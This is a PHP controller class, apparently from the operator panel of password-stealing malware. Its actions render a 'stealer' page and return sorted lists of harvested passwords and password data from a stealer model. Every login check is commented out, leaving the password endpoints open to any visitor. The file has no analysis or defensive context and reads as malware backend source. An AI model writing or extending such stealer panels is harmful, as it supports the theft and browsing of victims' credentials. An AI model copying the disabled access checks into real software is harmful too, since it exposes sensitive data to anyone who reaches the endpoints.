<?php
session_start();

class Controller_Stealer extends Controller {

    public function action_index() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Stealer();
            $this->model->setRequestData($this->data);
            $settings = $this->model->getSettings();
            $this->view->addJavaScripts(array(
                'plugins/pagination/pagination.min.js',
                'js/pages/stealer.js'
            ));
            $this->view->addCSS(array(
                'plugins/pagination/pagination.css'
            ));
            $this->view->generate('stealer_view.php', array('settings' => $settings));
        //}
    }

    public function action_getpasswords() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Stealer();
            $this->model->setRequestData($this->data);
            die($this->model->sortPasswords());
        //}
    }

    public function action_get_passwords_data() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Stealer();
            $this->model->setRequestData($this->data);
            die($this->model->getPasswordsData());
        //}
    }
}